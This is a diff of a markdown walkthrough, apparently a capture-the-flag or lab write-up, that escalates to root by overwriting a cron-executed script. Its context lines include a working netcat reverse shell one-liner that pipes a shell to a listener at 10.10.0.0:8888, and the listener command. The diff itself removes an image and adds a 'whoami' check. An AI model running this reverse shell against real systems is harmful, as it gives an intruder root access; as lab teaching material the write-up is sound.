@@ -81,7 +81,6 @@ password = password
 ### 6 Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"
 
 - echo "mkfifo /tmp/qjqlxog; nc 10.10.0.0 8888 0</tmp/qjqlxog | /bin/sh >/tmp/qjqlxog 2>&1; rm /tmp/qjqlxog" > autoscript.sh
-![1](https://user-images.githubusercontent.com/69840849/90490101-895fa900-e181-11ea-8166-ca5a4a637815.png)
 
 
 ### 7 After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvp 8888" and wait for our shell to land!
@@ -89,6 +88,8 @@ password = password
 
 
 ### 8 After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations! 
+[!] You may use the follow to check if it worked
+- whoami
 ![1](https://user-images.githubusercontent.com/69840849/90490473-01c66a00-e182-11ea-88c6-f84af16895ba.png)
 
 
